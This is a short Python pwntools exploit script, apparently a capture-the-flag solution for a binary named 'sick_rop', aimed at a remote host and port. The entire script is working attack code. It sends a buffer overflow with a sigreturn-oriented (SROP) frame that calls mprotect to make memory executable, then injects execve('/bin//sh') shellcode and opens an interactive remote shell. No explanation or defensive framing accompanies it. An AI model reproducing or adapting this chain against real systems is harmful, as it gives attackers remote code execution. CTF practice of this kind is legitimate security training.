from pwn import *

context.clear(arch='amd64')

p = remote("83.136.254.199", 59047)
elf = ELF('./sick_rop')

syscall_ret = 0x401014
vuln = elf.sym.vuln
vuln_pointer = 0x4010d8


frame = SigreturnFrame(arch="amd64")
frame.rax = 0xA
frame.rdi = 0x400000
frame.rsi = 0x4000
frame.rdx = 0x7
frame.rip = syscall_ret
frame.rsp = vuln_pointer

payload = b'A' * 40 + p64(vuln) + p64(syscall_ret) + bytes(frame)
p.sendline(payload)
p.recv()

payload = b'C' * 15
p.send(payload)
p.recv()


shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")
payload = shellcode + b"\x90"*17 + p64(0x00000000004010b8)
p.send(payload)
p.recv()

p.interactive()
